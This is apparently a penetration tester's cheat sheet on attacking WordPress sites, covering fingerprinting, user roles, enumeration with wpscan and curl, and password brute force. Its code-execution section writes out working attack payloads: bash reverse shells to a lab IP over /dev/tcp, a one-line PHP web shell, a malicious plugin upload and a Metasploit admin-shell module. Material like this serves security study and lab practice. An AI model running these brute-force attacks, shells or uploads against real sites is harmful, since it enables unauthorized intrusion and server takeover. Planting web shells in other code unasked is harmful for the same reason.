# Wordpress

The use of a CMS on a web application is usually quite easy to spot with visual elements:

* Credits at the bottom or corner of pages
* HTTP headers
* Common files (e.g. `robots.txt`, `sitemap.xml`)
* Comments and metadata (HTML, CSS, JavaScript)
* Stack traces and verbose error messages

There are five types of users on a standard WordPress installation.

1. Administrator: This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.
2. Editor: An editor can publish and manage posts, including the posts of other users.
3. Author: They can publish and manage their own posts.
4. Contributor: These users can write and manage their own posts but cannot publish them.
5. Subscriber: These are standard users who can browse posts and edit their profiles.

Getting access to an administrator is usually sufficient to obtain code execution on the server. Editors and authors might have access to certain vulnerable plugins, which normal users don’t

For Wordpress :

* Plugins are stored in `wp-content/plugins`
* Themes are stored in `wp-content/themes`
* Login page is `/wp-admin`, `/wp-login`

We can enumerate users with the different error messages on the `/wp-admin` page

### Enumeration

We should spend some time manually browsing the site and looking through the page source for each page, grepping for the `wp-content` directory, themes and plugin, and begin building a list of interesting data points

Check the version of each enumerated themes / plugin for known vulnerability

```shellscript
# Enumerate themes, plugins and users
sudo wpscan --url <URL> -e --plugins-detection aggressive --api-token <TOKEN>

# Look at the source code as it would indicate the use and version of WP
curl -s <URL> | grep WordPress

# Grep the source code for themes and version
curl -s <URL> | grep themes

# Grep the source code for plugins and version
curl -s <URL> | grep plugins

# We should then go to the directory of each plugin, to see if directory listing is
# enabled, and look for the plugins version. If we find it then look for vulns 
```

### Attacking

#### Brute force

```shellscript
# xmlrpc api => faster but sometimes didn't work
sudo wpscan --password-attack xmlrpc -t 20 -U <USER> -P <WORDLIST> --url <URL>

# Classic brute force
sudo wpscan -t 20 -U <USER> -P <WORDLIST> --url <URL>
```

#### Code execution

For this attack, we will need administrative access to the application (admin credentials)

**Theme editor**

`Appearance` ⇒ `theme editor` ⇒ modify the PHP source code (ex 404.php)

```shellscript
# Insert a shell in the source code
exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.36/1234 0>&1'");    # Reverse shell
system($_GET[0]);    # Web shell

# Update on the bottom and navigate to the page to execute the code
# Themes are located at /wp-content/themes/<THEME_NAME>/<MODIFIED_PHP_FILE>
curl <URL>/wp-content/themes/twentynineteen/404.php

# We can use metasploit to automate the process
use exploit/unix/webapp/wp_admin_shell_upload 
```

**New plugin**

`Plugin` ⇒ `Add New` ⇒ `Upload Plugin`

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.4/1234 0>&1'");
```

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FcZltk28dgzlkQ11eNbeX%2Fimage.png?alt=media&#x26;token=bee91888-3db9-46f2-8e75-f75b337366d3" alt=""><figcaption></figcaption></figure>

If we go to the media section, click on the top left icon, we can see our shell

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FgJuGbWQAjTFJsABuXFOh%2Fimage.png?alt=media&#x26;token=8f9f72e4-6f20-49a5-bfa0-d8a34c896f99" alt=""><figcaption></figcaption></figure>

If we click to view it, it gives us the link to access it, which give us a rev shell

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FbARyHW2TkdNsuTYIVDgH%2Fimage.png?alt=media&#x26;token=e9453c74-10cb-45f1-ad7b-91b3cf5227a2" alt=""><figcaption></figcaption></figure>
